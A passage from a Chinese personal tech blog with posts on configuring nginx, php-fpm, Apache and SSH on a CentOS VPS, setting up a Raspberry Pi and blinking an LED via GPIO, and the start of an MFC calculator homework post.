class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="preprocessor">#error_page  <span class="number">404</span>              /<span class="number">404.</span>html;</span></span><br><span class="line"></span><br><span class="line">    <span class="preprocessor"># redirect server <span class="keyword">error</span> pages to the static page /<span class="number">50</span>x.html</span></span><br><span class="line">    <span class="preprocessor">#</span></span><br><span class="line">    error_page   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /<span class="number">50</span>x.html;</span><br><span class="line">    location = /<span class="number">50</span>x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="preprocessor"># proxy the PHP scripts to Apache listening on <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></span></span><br><span class="line">    <span class="preprocessor">#</span></span><br><span class="line">    <span class="preprocessor">#location ~ \.php$ &#123;</span></span><br><span class="line">    <span class="preprocessor">#    proxy_pass   http:<span class="comment">//127.0.0.1;</span></span></span><br><span class="line">    <span class="preprocessor">#&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="preprocessor"># pass the PHP scripts to FastCGI server listening on <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span></span></span><br><span class="line">    <span class="preprocessor">#</span></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           /usr/share/nginx/html;</span><br><span class="line">        fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>改<code>server_name</code>后面的地址为<code>localhost</code></li>
<li>改<code>location</code>中的<code>root</code>地址为<code>/usr/share/nginx/html</code></li>
<li>在index        index.html        index.htm后加上index.php</li>
<li>把<code>&quot;location ~ \.php$ {&quot;,</code>前的注释去了，改<code>fastcgi_param</code>后面的内容为<code>SCRIPT_FILENAME  $document_root</code></li>
</ul>
<p>保存退出后打开php-fpm的配置:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php-fpm.<span class="keyword">d</span>/www.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure></p>
<p>找到<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Unix user/<span class="keyword">group</span> <span class="title">of</span> processes</span><br><span class="line">; Note: The <span class="keyword">user</span> <span class="title">is</span> mandatory. If the <span class="keyword">group</span> <span class="title">is</span> not set, the default user's <span class="keyword">group</span></span><br><span class="line"><span class="title">;	will</span> be used.</span><br><span class="line">; RPM: apache Choosed to be able to access some dir as httpd</span><br><span class="line"><span class="keyword">user</span> <span class="title">= nginx</span></span><br><span class="line">; RPM: Keep a <span class="keyword">group</span> <span class="title">allowed</span> to <span class="operator">write</span> <span class="operator">in</span> log dir.</span><br><span class="line"><span class="keyword">group</span> <span class="title">= nginx</span></span><br></pre></td></tr></table></figure></p>
<p>改成<code>User=nginx</code>，<code>group=nginx</code><br>重新启动php-fpm即可</p>
<h3 id="u53C2_u8003_u7684_u6587_u6863"><a href="#u53C2_u8003_u7684_u6587_u6863" class="headerlink" title="参考的文档"></a>参考的文档</h3><p><a href="http://nginx.org/en/docs/" target="_blank" rel="external">Nginx官方文档</a><br><a href="https://support.rackspace.com/how-to/installing-nginx-and-php-fpm-setup-for-nginx/" target="_blank" rel="external">Installing Nginx and php-fpm - Setup For Nginx</a><br><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="external">Nginx -PHP FastCGI Example</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/服务器/">服务器</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2016-02-16-vps" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/16/2016-02-16-vps/" class="article-date">
  	<time datetime="2016-02-16T02:40:25.000Z" itemprop="datePublished">2016-02-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/16/2016-02-16-vps/">centos搭建服务器－安装apache</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p>好久都没更新博客里面的文章了，快要开学了发现寒假自己什么都没搞出来啊啊啊……最蛋疼的是学校的智能车比赛的网站，要实现论坛的功能。学校的服务器现在又不让用，只好在我自己的VPS上搭建一个简易的服务器来测试了。这是我开始自己搭服务器过程的记录，可能会有点乱……</p>
</li>
<li><p>我在本地使用的是Mac OS X，远程服务器运行的是centos-6 x86系统。这个VPS是在<a href="https://bandwagonhost.com/" target="_blank" rel="external">Bandwagon</a>上购买的，可以使用shadowsocks科学上网(咦，我好像说了什么不该说的)。</p>
</li>
</ul>
<p>##LAMP环境<br>所谓LAMP就是Linux+apache+MySQL+PHP，我目前只装好了apache……不然怎么能是万里长征第一步～</p>
<p>###安装Apache<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="operator"><span class="keyword">install</span> httpd</span><br><span class="line">chkconfig <span class="comment">--level 235 httpd on</span></span><br><span class="line">/etc/init.<span class="keyword">d</span>/httpd <span class="keyword">start</span></span></span><br></pre></td></tr></table></figure></p>
<p>安装完后在浏览器中输入远程服务器的IP地址，看到这样的画面就说明安装成功了。<img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f11dv2fa1hj31700rh15c.jpg" alt="屏幕快照"></p>
<p>###配置ssh<br>配置ssh的目的在于方便的上传和下载文件，更加流畅的终端输入体验……<br>在终端中输入如下命令:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="operator"><span class="keyword">install</span> openssh-<span class="keyword">server</span></span></span><br></pre></td></tr></table></figure></p>
<p>安装完成后启动sshd服务:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/sshd <span class="literal">start</span></span><br></pre></td></tr></table></figure></p>
<p>设置开机启动:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig sshd <span class="function_start"><span class="keyword">on</span></span></span><br></pre></td></tr></table></figure></p>
<p>我在本地使用:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">138.128</span><span class="number">.197</span><span class="number">.11</span></span><br></pre></td></tr></table></figure></p>
<p>报错<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh: connect to host <span class="number">138.128</span><span class="number">.197</span><span class="number">.11</span> port <span class="number">22</span>: Connection refused</span><br></pre></td></tr></table></figure></p>
<p>我用<code>netstat -antp |grep sshd</code>命令查看了一下，系统的响应是这样的<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*                   LISTEN      <span class="number">3746</span>/sshd</span><br></pre></td></tr></table></figure></p>
<p>问题应该是出在了ssh的隧道没有对公网开放<br>修改ssh的配置文件<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p>
<p>把<code>ListenAddress 0.0.0.0</code>改为<code>ListenAddress 138.128.197.11</code>这个是我远程服务器的IP，重新启动ssh服务发现无法启动，终端提示要先定义端口，我并不知道为什么……在刚刚那行配置前加上<code>port 22</code>然后<code>service sshd restart</code>，居然就成功了<br>附上成功后的图<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f11duxql7pj313r0p0167.jpg" alt="屏幕快照"> </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/操作系统/">操作系统</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2015-12-17-pi" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/17/2015-12-17-pi/" class="article-date">
  	<time datetime="2015-12-17T02:40:25.000Z" itemprop="datePublished">2015-12-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/17/2015-12-17-pi/">通过python控制Pi的GPIO</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="python_GPIO_u96C6_u6210_u5E93"><a href="#python_GPIO_u96C6_u6210_u5E93" class="headerlink" title="python GPIO集成库"></a>python GPIO集成库</h2><p>我大概了解了下树莓派的几种库，比较常见的有python GPIO，BCM2835    C    Library还有wiringPi，其实对于我们自动化的学生来说最熟悉的应该就是wiringPi。Pi的官方资料中推荐的是python GPIO，而且相较于C，python更加简洁易读。</p>
<h2 id="u8BA9LED_u95EA_u70C1"><a href="#u8BA9LED_u95EA_u70C1" class="headerlink" title="让LED闪烁"></a>让LED闪烁</h2><p>在这个实验中，我只是简单的控制了一个GPIO口，输出一个方波信号，占空比50%，这样就可以让一个LED小灯闪烁。  </p>
<ul>
<li>连接实验电路<br>在单片机学习中，掌握好各个引脚的功能是非常重要的，要根据电路的连接来写相关的控制程序。在Pi中我们可以使用<code>GPIO readall</code>来列出所有的引脚，便于我们下一步操作。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzgw1ez451il6owj30fu0cjjue.jpg" alt="引脚图"><br>然后将LED，电阻串联起来，LED正端接GPIO口，负接地。记得用杜邦线，拿着导线乱碰很可能导致引脚短路，损坏Pi。   </li>
<li>Python代码部分<br>新建LED.py文件，加入以下代码:   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blink</span><span class="params">(pin)</span>:</span></span><br><span class="line">        GPIO.output(pin,GPIO.HIGH)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">		GPIO.output(pin,GPIO.LOW)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">GPIO.setmode(GPIO.BOARD)</span><br><span class="line">GPIO.setup(<span class="number">7</span>,GPIO.OUT）</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">        blink(<span class="number">7</span>)</span><br><span class="line">GPIO.cleanup()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>然后执行下试试吧～<br><img src="http://ww4.sinaimg.cn/large/005WMcFzgw1ez452ev870j31kw16oncv.jpg" alt="点亮的LED"><br>图是随手拍的，桌上的电阻都有点大了，亮起来不明显。建议大家还是串上一个阻值合适的电阻，GPIO输出的电压幅值好像是1V。当然大家就不要作死把发光二极管直接接在3.3V和GND之间了，不要问我是怎么知道的+_+，我炸了一个。<br>可以通过:   </p>
<pre><code class="c">pi@raspberrypi:~/Desktop $ sudo cat /sys/kernel/debug/gpio
GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<span class="number">3f</span>200000.gpio, pinctrl-bcm2835:
 gpio<span class="number">-35</span>  (?                   ) in  hi
 gpio<span class="number">-47</span>  (?                   ) out lo
</code></pre>
<p>来查看引脚状态。</p>
<p>最后说两句题外话吧:<br>其实系里还是挺关心我们的，想要什么小零件基本都能提供。模电老师还给我们每个人准备了一个小器件包，里面有面包版，各种电容电阻什么的。虽然都不是什么精贵的东西，但看到宿舍里有各种各样的小元件和各种工具，总有一种迷之幸福感。万用表好像也可以向系里申请了，还是希望系里越来越好吧（≧∇≦）</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pi/">Pi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/嵌入式开发/">嵌入式开发</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2015-12-13-pi" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/13/2015-12-13-pi/" class="article-date">
  	<time datetime="2015-12-13T02:40:25.000Z" itemprop="datePublished">2015-12-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/13/2015-12-13-pi/">Raspberry Pi开启SSH和VNC</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>Raspberry装好了，显示器也搞定了，玩了整整一天(☆_☆)，发现了一个小问题：我的桌面不够大呀！！！显示器，树莓，笔记本电脑，外卖，概率作业不够放了怎么破，立马想到看过可以通过SSH和VNC的方式访问Pi，来试试吧！  </li>
</ul>
<h2 id="u4E24_u79CD_u65B9_u5F0F"><a href="#u4E24_u79CD_u65B9_u5F0F" class="headerlink" title="两种方式"></a>两种方式</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>命令行访问Pi，轻巧且功能强大。简单配置一下Pi,打开SSH服务即可:<br><code>service ssh start</code><br>在Mac终端输入:<br><code>sudo ssh pi@192.168.1.6</code>  </p>
<p><code>192.168.1.6</code>是Pi的ip。输入Pi的密码就可以连上了。更多的配置不细讲了，<a href="http://www.jianshu.com/p/a011d01bdf51" target="_blank" rel="external">简书</a>的这篇文章提到了关于配置root用户ssh登录的权限问题，<a href="http://liberize.me/tech/access-raspberry-pi-via-ssh-and-vnc.html" target="_blank" rel="external">liberize.blog</a>提到了使用私钥登录的问题。  </p>
<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>如果要使用Pi的图形界面，大家可以使用VNC服务。Pi需要安装vnc服务端，并在Mac上安装tigervnc(icon挺帅的)。   </p>
<h4 id="Pi_u7684_u914D_u7F6E"><a href="#Pi_u7684_u914D_u7F6E" class="headerlink" title="Pi的配置"></a>Pi的配置</h4><p>我查到的资料大多数是在Pi上安装tightvncserver<code>sudo apt-get install tightvncserver</code>，简单的配置下用<code>service start tightvncserver</code>发现终端报错了。找不到目录的原因不清楚……<br>我发现在Jessie中貌似已经安装VNC服务，抱着试试的心态输入<code>vncserver</code><br>终端出现了帮助页面，可以这样打开VNC服务:<br><code>vncserver:1</code></p>
<h4 id="Mac_u7684_u914D_u7F6E"><a href="#Mac_u7684_u914D_u7F6E" class="headerlink" title="Mac的配置"></a>Mac的配置</h4><p>安装tigervnc<a href="https://github.com/TigerVNC/tigervnc/releases" target="_blank" rel="external">下载</a>，编译安装。<br>发现Homebrew可以直接装，果断弃了tar.gz<br><code>brew cask install tigervnc-viewer</code><br>打开tigervnc，输入<code>192.168.1.6</code>，点Connect就连上啦。  </p>
<h2 id="u60EF_u4F8B"><a href="#u60EF_u4F8B" class="headerlink" title="惯例"></a>惯例</h2><p>放上一些图片吧<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1eyyf1w019uj32io1w0hdt.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyyf1woamxj31400p0dk1.jpg" alt=""><br>发现屏下面垫一个橡皮还蛮不错的…… 下一阶段是学习GPIO的使用，主要还是使用WiringPi或者BCM2835    C    Library来写，Python正在学ˊ_&gt;ˋ     </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pi/">Pi</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/嵌入式开发/">嵌入式开发</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2015-12-12-pi" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/2015-12-12-pi/" class="article-date">
  	<time datetime="2015-12-12T03:40:25.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/2015-12-12-pi/">Raspberry Pi上手体验</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>生日快到了，女票送了一个树莓ψ(｀∇´)ψ,好开心，简单写下使用体验吧。</li>
</ul>
<h2 id="Raspberry_Pi_u7B80_u4ECB"><a href="#Raspberry_Pi_u7B80_u4ECB" class="headerlink" title="Raspberry Pi简介"></a>Raspberry Pi简介</h2><p>树莓派（英语：Raspberry Pi），是一款基于Linux系統的只有信用卡大小的单片机电脑。它由英国的树莓派基金会所开发，目的是以低价硬件及自由软件刺激在学校的基本电脑科学教育。配备有Broadcom出产的ARM架构700MHz BCM2836处理器，1G内存，还有一些必须的接口。<br>除了电脑上都有的接口，树莓派还有GPIO的拓展接口，这为工科狗实现一些很有意思的想法提供了巨大的空间，比如四轴飞行器，智能小车什么的。先留个坑，以后再填吧。</p>
<h2 id="u7CFB_u7EDF_u7684_u5B89_u88C5"><a href="#u7CFB_u7EDF_u7684_u5B89_u88C5" class="headerlink" title="系统的安装"></a>系统的安装</h2><ol>
<li>在Pi的官网上下载系统镜像<a href="https://www.raspberrypi.org/downloads" target="_blank" rel="external">(下载页面)</a>,我选择的是Raspbian(名字Raspberry+Debian233),解压后得到一个.img镜像。 </li>
<li>插入TF卡，用df命令查看当前挂载的卷：<br><code>df -h</code><br>确认设备<br><code>diskutil list</code><br>确定一下你的TF卡是哪个。</li>
<li>卸载TF卡上的分区<br><code>diskutil unmount /dev/disk2   // /dev/disk2是我的TF卡</code></li>
<li>将系统刷入卡中<br>把当前目录切换到要装载的系统镜像的所在目录<br><code>sudo dd bs=4m if=2015-11-21-raspbian-jessie.img of=/dev/rdisk2</code><br>输入密码后不会出现任何提示，要等上几分钟，别着急用ctrl+c结束。</li>
<li>卸载设备<br><code>diskutil unmountDisk /dev/disk2</code>    </li>
</ol>
<h2 id="Pi_u7684_u5F00_u673A_u914D_u7F6E"><a href="#Pi_u7684_u5F00_u673A_u914D_u7F6E" class="headerlink" title="Pi的开机配置"></a>Pi的开机配置</h2><h3 id="u8BED_u8A00_u548C_u952E_u76D8"><a href="#u8BED_u8A00_u548C_u952E_u76D8" class="headerlink" title="语言和键盘"></a>语言和键盘</h3><p>把HDMI，鼠标键盘电源线接好，然后它居然直接出现了桌面，难道是我的人品太好（ ｉ <em> ｉ ）。<br>激动的点开终端，咦，怎么有些键不能用=</em>=<br>别慌，Pi是腐国的产品，默认的是英式键盘的键位，我们使用的大部分都是美式键盘。所以我们简单的配置下:<br>终端输入<br><code>raspi-config</code><br>选<code>Internationalisation opntions</code><br>选<code>I3 Change Keyboard Layout</code><br>选<code>Generic 101-key  PC</code><br>选<code>Other</code><br>选<code>English(US)</code><br>选<code>English(US) - English(US,alternative international)</code><br>后面都选择确定，键盘上下键选择，tab切换选项，enter确定。<br>注意！！！我不建议大家把Pi的系统语言改成中文的，至于为什么大家试一试就知道了，字体炸裂……<br>注:编码需要选择下，UTF-8，原因大家都懂。给个<a href="http://www.guokr.com/post/520901/" target="_blank" rel="external">果壳</a>的参考，我就不多写了。  </p>
<h3 id="u5B89_u88C5_u4E2D_u6587_u8F93_u5165_u6CD5"><a href="#u5B89_u88C5_u4E2D_u6587_u8F93_u5165_u6CD5" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p><code>sudo apt-get -y install ttf-wqy-zenhei</code></p>
<h3 id="u5B89_u88C5VIM"><a href="#u5B89_u88C5VIM" class="headerlink" title="安装VIM"></a>安装VIM</h3><p>好吧，这步大家可以跳过，我有强迫症:-)<br><code>sudo apt-get install -y vim</code><br>简单配置下代码高亮<br>在～目录下新建.vimrc文件，写入下面的内容:  </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">nu</span></span><br><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span></span><br></pre></td></tr></table></figure>
<h2 id="u914D_u7F6Ewatchdog"><a href="#u914D_u7F6Ewatchdog" class="headerlink" title="配置watchdog"></a>配置watchdog</h2><p>Pi的看门狗防止程序死循环，设置好就能让Pi在当机的时候自动重启。 </p>
<ol>
<li>启动硬件看门狗模块<br><code>sudo modprobe bcm2708_wdog</code></li>
<li>编辑/etc/modules,启动时自加载模块<br><code>sudo vim /etc/modules</code><br>在文件的最后加上<br><code>bcm2708_wdog</code></li>
<li>启动与配置watchdog<br>启动watchdog<br><code>sudo /etc/init.d/watchdog start</code><br>编辑配置文件<br><code>sudo vim /etc/watchdog.conf</code><br>把<code>#watchdog-device =/dev/watchdog</code>前面的<code>#</code>删去<br>重新启动watchdog<br><code>sudo /etc/init.d/watchdog restart</code><br>还可以监控芯片温度什么，过热自动重启之类。<h2 id="u4E00_u4E9B_u5C0F_u63D2_u66F2_u548C_u968F_u624B_u62CD_u7684_u56FE"><a href="#u4E00_u4E9B_u5C0F_u63D2_u66F2_u548C_u968F_u624B_u62CD_u7684_u56FE" class="headerlink" title="一些小插曲和随手拍的图"></a>一些小插曲和随手拍的图</h2></li>
</ol>
<ul>
<li>中间有个小小的意外，我随手装了个多媒体系统试试效果，XBMC，就是这货，装完重启直接进不了系统了233。简单分析了下原因，貌似是显存分配不足，应该要在安装前配置下内存的分配。这个小插曲直接导致了我决定今晚赶紧把今天做的配置记录下来。这样一块用来折腾的Pi估计以后要经常重刷系统了=_=  </li>
<li>桌面上的显示器是一块笔记本的屏，我又在万能的某宝上买了块驱动版，我现在打算买个相框把屏幕裱起来。话说不加壳的屏真的是好薄啊，看起来很有逼格。<br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyx9x5jdvej32io1w0e81.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1eyx9wypk1rj32io1w0npd.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1eyx9whbb85j32io1w01kx.jpg" alt=""><h2 id="u6700_u540E_u7684_u6700_u540E"><a href="#u6700_u540E_u7684_u6700_u540E" class="headerlink" title="最后的最后"></a>最后的最后</h2>感谢我爱的和爱我的票票！！！</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pi/">Pi</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/嵌入式开发/">嵌入式开发</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2015-12-08-mfc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/09/2015-12-08-mfc/" class="article-date">
  	<time datetime="2015-12-09T08:34:43.000Z" itemprop="datePublished">2015-12-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/09/2015-12-08-mfc/">MFC POJ4</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="MFC_u7684_u4F5C_u4E1A"><a href="#MFC_u7684_u4F5C_u4E1A" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
<li>编写一个计算器程序。使用该计算机使用编辑控件直接输入数据，并有加减乘除、平方根和倒数运算功能。</li>
<li>简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。</li>
</ul>
<h3 id="u4EE3_u7801_u90E8_u5206"><a href="#u4EE3_u7801_u90E8_u5206" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSetfocusInput() </span><br><span class="line">&#123;</span><br><span class="line">	m_fInput=<span class="number">0.0</span>;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnAdd() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnCalc() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	UpdateData(TRUE);</span><br><span class="line">	<span class="keyword">switch</span>(m_nOP)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		    m_fResult=m_fInput;</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			m_fResult+=m_fInput;</span><br><span class="line">	